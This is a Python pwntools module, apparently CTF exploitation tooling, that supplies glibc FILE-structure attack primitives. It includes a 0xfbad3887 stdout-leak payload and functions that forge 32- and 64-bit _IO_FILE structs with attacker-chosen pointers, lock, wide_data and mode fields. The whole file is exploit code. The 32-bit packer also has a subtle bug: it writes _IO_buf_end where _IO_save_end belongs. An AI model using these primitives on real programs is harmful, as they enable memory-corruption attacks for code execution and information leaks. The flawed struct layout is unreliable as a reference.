from pwn import *

def ioleak(is32=False):
    if is32:
        # 0x11 bytes
        return p32(0xfbad3887)+p32(0)*3+b'\x00'
    else:
        # 0x21 bytes
        return p64(0xfbad3887)+p64(0)*3+b'\x00'

def pack_file32(
        _flags = 0,
        _IO_read_ptr = 0,
        _IO_read_end = 0,
        _IO_read_base = 0,
        _IO_write_base = 0,
        _IO_write_ptr = 0,
        _IO_write_end = 0,
        _IO_buf_base = 0,
        _IO_buf_end = 0,
        _IO_save_base = 0,
        _IO_backup_base = 0,
        _IO_save_end = 0,
        _IO_marker = 0,
        _IO_chain = 0,
        _fileno = 0,
        _lock = 0,
    ):
    file_struct=p32(_flags) + \
                p32(_IO_read_ptr) + \
                p32(_IO_read_end) + \
                p32(_IO_read_base) + \
                p32(_IO_write_base) + \
                p32(_IO_write_ptr) + \
                p32(_IO_write_end) + \
                p32(_IO_buf_base) + \
                p32(_IO_buf_end) + \
                p32(_IO_save_base) + \
                p32(_IO_backup_base) + \
                p32(_IO_buf_end) +\
                p32(_IO_marker)+\
                p32(_IO_chain) + \
                p32(_fileno)
    file_struct=file_struct.ljust(0x48,b'\x00')
    file_struct+=p32(_lock)
    file_struct=file_struct.ljust(0x94,b'\x00')
    return file_struct

def pack_file64(_flags = 0,
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0,
              _wide_data = 0,
              _mode = 0):
    file_struct = p32(_flags) + \
            p32(0) + \
            p64(_IO_read_ptr) + \
            p64(_IO_read_end) + \
            p64(_IO_read_base) + \
            p64(_IO_write_base) + \
            p64(_IO_write_ptr) + \
            p64(_IO_write_end) + \
            p64(_IO_buf_base) + \
            p64(_IO_buf_end) + \
            p64(_IO_save_base) + \
            p64(_IO_backup_base) + \
            p64(_IO_save_end) + \
            p64(_IO_marker) + \
            p64(_IO_chain) + \
            p32(_fileno)
    file_struct = file_struct.ljust(0x88, b"\x00")
    file_struct += p64(_lock)
    file_struct = file_struct.ljust(0xa0, b"\x00")
    file_struct += p64(_wide_data)
    file_struct = file_struct.ljust(0xc0, b'\x00')
    file_struct += p64(_mode)
    file_struct = file_struct.ljust(0xd8, b"\x00")
    return file_struct